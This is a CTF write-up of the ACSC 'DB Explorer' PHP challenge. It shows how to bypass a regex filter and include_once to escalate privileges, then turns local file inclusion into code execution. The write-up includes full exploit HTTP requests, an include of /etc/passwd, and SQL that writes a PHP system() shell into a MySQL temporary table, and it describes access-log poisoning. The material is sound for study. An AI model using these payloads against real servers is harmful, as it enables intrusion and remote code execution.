---
title: ACSC - [DB Explorer]
tags:
  - CTF
  - Write-up
  - web-exploitation
  - acsc
  - server-side
  - php
  - include_once-bypass
  - lfi
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-04-02 at 16.44.05.png]]
# Prologue
An online CTF competition by ACSC, this competition is qualification for competing in ICC for ASIA category.

![[dist-db-exp-821ecd94f8f5b8e64d1233744b005d5eadf79e36.tar.gz]]
# Write Up
## TL;DR Solution

By default, the player has a normal user role. This role able to include any file, but it must has a `.php` suffix and there's a regex restriction. To achieve privilege escalation into admin role, player need to include the `level_checker` file after bypassing the regex. After that, it need to bypass the `include_once` by using these bugs in php
- By using known bugs in [bugs.php.net](https://bugs.php.net/bug.php?id=16409);
- Or, By using nested symlink

After gaining the admin role, player can make arbitrary include and escalated it into code execution by using these techniques: 
- Intended
	- LFI From Temporary Table
- Unintended
	- LFI From Access Logs
	- LFI From Nginx Body Buffer
## Detailed Explanation (Intended)

### Initial Analysis

We were given the configuration like this
![[Screenshot 2024-04-23 at 16.37.28.png]]

If we are looking at `Dockerfile`, it's already obvious, we need to execute the binary to get the flag
```Dockerfile
FROM ubuntu:20.04
# 8< -- snip - snip -- >8
COPY ./flag.c /tmp/flag.c

RUN rm /var/www/html/index.nginx-debian.html
RUN gcc /tmp/flag.c -o /flag && rm /tmp/flag.c
RUN chown -R www-data /var/lib/mysql && chown -R www-data /var/run/mysqld
RUN chmod 755 /etc/mysql/my.cnf
RUN chmod 711 /flag
RUN chmod 700 /entrypoint.sh
RUN chmod 755 /entrypoint.sh

ENTRYPOINT /entrypoint.sh
```

In `docker-compose.yml` file, we can see that this application consists of two application. The web application and `phpmyadmin`.

```yaml
version: '3.4'

services:
  server:
    image: dbexplorer
    build: ./server
    ports:
      - "9000:80"
  pma:
    image: phpmyadmin:latest
    environment:
      - PMA_ARBITRARY=1
    expose:
      - 80
```

The exposed port is `80`. So, our requests will be proxy-ed by nginx and filtered according to the `server_name`. The default proxy is `phpmyadmin`, and the web application is using vHost `admin.pepe`.
```conf
upstream pma-server {
    server pma:80;
}


server {
    listen 80;

    location / {
        proxy_pass http://pma-server/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}

server {
    listen 80;
    server_name admin.pepe;

    location ~ \.php$ {
        root           /var/www/html;
                
        fastcgi_pass   unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_index  index.php;
                
        fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include        fastcgi_params;

        access_log  /dev/null;
        error_log /dev/null;
    }
}
```



In this index file, we can see that our role by default is level 0. After that, the application will include the `level_checker.php`. There's also a regex check where we can't put `*:*` to prevent us including php filters / protocol. So, our goal now is finding a way to achieve privilege escalation into `admin` role, so we can include arbitrary file.
```php
<html>
<h1>Under development</h1>

<?php
define("__INDIRECT__",true);

session_start();

if(!$level) $level = 0;

include_once "level_checker.php";

if(preg_match('/(.*):(.*)/', $_GET['normal'].$_GET['admin'])) exit("Hmm, are you sure?");

// You can only include php file if you are not an admin!
if($level == 1){
    include_once $_GET['normal'].".php";
}

if($level == 2) {
    include $_GET['admin'];
}

?>
```

In this `level_checker.php`. As we can see, we're at level 0, and there's an increment in our level into level 1. Therefore, our role now is `normal` user. There's also a regex check where we shouldn't have `level_checker` word in the `$_REQUEST` (GET/POST/etc.)
```php
<?php
if(__INDIRECT__ !== true) exit("No direct call");
session_start();

# level == 1 => normal user / no permission!
# level == 2 => admin user / Hey there :)

if(preg_match('/(.*)level_checker(.*)/', $_REQUEST['normal'])) exit("What are you doing? lol");

if($_SESSION['user'] === "admin") $level = 2;
else $level += 1;

?>
```

So, if we were able to include `level_checker.php` twice, we will elevate our privilege into admin role.
#### Regex Bypass

There's a validation confusion in the `level_checker.php`. In this regex, the validation accept a `$_REQUEST`[^1] (It means, it will accept `$_GET` and `$_POST`).
```php
# 8< -- snip - snip -- >8
if(preg_match('/(.*)level_checker(.*)/', $_REQUEST['normal'])) exit("What are you doing? lol");
# 8< -- snip - snip -- >8
```

While in the `index.php`, the parameter `normal` is only accept `$_GET`. 
```php
# 8< -- snip - snip -- >8
if($level == 1){
    include_once $_GET['normal'].".php";
}
# 8< -- snip - snip -- >8
```

So, our requests will be like this.

```http
POST /index.php?normal=level_checker HTTP/1.1
Host: admin.pepe
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

normal=testing
```

Unfortunately, We still at level 1 (normal user). Because of the statement `include_once`[^2] . Where it means `level_checker.php` will be evaluated once during runtime.
#### Include_once Bypass

By doing google-fu, i found an old issue about `include_once` in [bugs.php.net (#16409)](https://bugs.php.net/bug.php?id=16409) in 2002,

> I then looked where there might be a problem with my installation and finally found, that the problem occurs, if the webserver does not have read access to all directories on the path to the script file. I had my home dir set to rwx--x--x for privacy reasons. Giving read-access for the world, solved the problem.

In 2014 and 2015, there's a comment where the bugs still exists. So, i give a shot to try it. And unfortunately, it didn't work, the path is resulting in absolute path and not relative path anymore.
![[Screenshot 2024-04-23 at 18.12.01.png]]

But, when I am trying to messing around with it, i had an idea where we can use `/proc/self/cwd`[^3] and by using `/root` as the non-readable path. And it's really magically work
![[Screenshot 2024-04-23 at 18.13.03.png]]

The resulting path for some reason now is `/proc/self/cwd` instead of `/tmp/acsc/db-exp`. 

Testing it in remote and it did really work.
![[Screenshot 2024-04-23 at 18.14.17.png]]
```http
POST /index.php?normal=/root/../proc/self/cwd/level_checker&admin=/etc/passwd HTTP/1.1
Host: admin.pepe
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

normal=testing
```

With this we were able to achieve privilege escalation, and able to include arbitrary file.
#### LFI From MySQL Temporary Table

Our goals is code execution. And since we haven't analyze the correlation `phpmyadmin`, we can check the mysql configuration.

In the application, author's already giving the player pre-configured mysql server. But, it did has a strict user permission.
```sql
CREATE database admin_debug;
use mysql;
CREATE user 'demo'@'%' identified by 'demo';
GRANT SELECT, CREATE TEMPORARY TABLES on admin_debug.* to 'demo'@'%';
FLUSH PRIVILEGES;
```

As we can see, the user only has a strict permission SQL commands. By default, MySQL store the information (such as database, tables, columns, data, etc) in files format. And those files are usually stored at `/var/lib/mysql` folder. Therefore, we may be able to create a php shell by using those features.

So, I began monitoring those folder and creating a delay to prevent mysql table deleted after execution.
```sql
CREATE TEMPORARY TABLE credits(
  customerNumber INT PRIMARY KEY, 
  creditLimit TEXT
);

INSERT INTO credits VALUES (1, 'TESTINGNYX');
SELECT SLEEP(10000);
```

And, I finally did find a way to write an arbitrary file content.
![[Screenshot 2024-04-23 at 18.32.28.png]]

### Exploitation

By combining our findings before, We can escalate it our exploit into code execution.

Create a php shell where it execute `/flag`. 
```sql
CREATE TEMPORARY TABLE credits(
  customerNumber INT PRIMARY KEY, 
  creditLimit TEXT
);

INSERT INTO credits VALUES (1, '<?=system("/flag");?>');
SELECT SLEEP(10000);
```

After that, our php shell is successfully executed and we can get the flag.
![[Screenshot 2024-04-23 at 18.38.54.png]]

## Detailed Explanation (Unintended)

### LFI From Access Logs

If we're looking at the nginx config once again, the author's forgot to clearing up the logs for `phpmyadmin` application. Therefore, we can make an arbitrary string and load it without needing to create temporary table.

```conf
server {
    listen 80;

    location / {
        proxy_pass http://pma-server/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

And for some reason, the owner of file is `www-data`. So, the file is readable to us
![[Screenshot 2024-04-23 at 18.49.25.png]]

Poisoning the access.log
![[Screenshot 2024-04-23 at 18.50.16.png]]

Accessing the poisoned log
![[Screenshot 2024-04-23 at 18.50.44.png]]
### LFI From Nginx Body Buffer

There's another unintended where we can exploit the nginx buffer, a similar exploit with this

https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html

https://hxp.io/blog/90/hxp-CTF-2021-includers-revenge-writeup/

FLAG: `ACSC{<hashes_flag>}`
# Epilogue

Another vector to bypass the `*_once`:
- Docker Volumes
	- During competition, Sometimes I modified the `docker-compose.yml` by mounting the host into container using `volumes`[^4] key for debugging purpose. 
	- During fuzzing the characters, and trying to find a possible collision in unicode filename. I discovered, If the file is mounted, The file is case-insensitive.
	- ![[Screenshot 2024-04-23 at 19.00.00.png]]
- A nested symlink
	- After competition, Bypassing `include_once` can be achieved by using nested symlink in `/proc/self/root`
	- ![[Screenshot 2024-04-23 at 18.53.47.png]]






[^1]: https://www.php.net/manual/en/reserved.variables.request.php
[^2]: https://www.php.net/manual/en/function.include-once.php
[^3]: https://man7.org/linux/man-pages/man5/proc.5.html#:~:text=/proc/pid/cwd
[^4]: https://docs.docker.com/storage/volumes/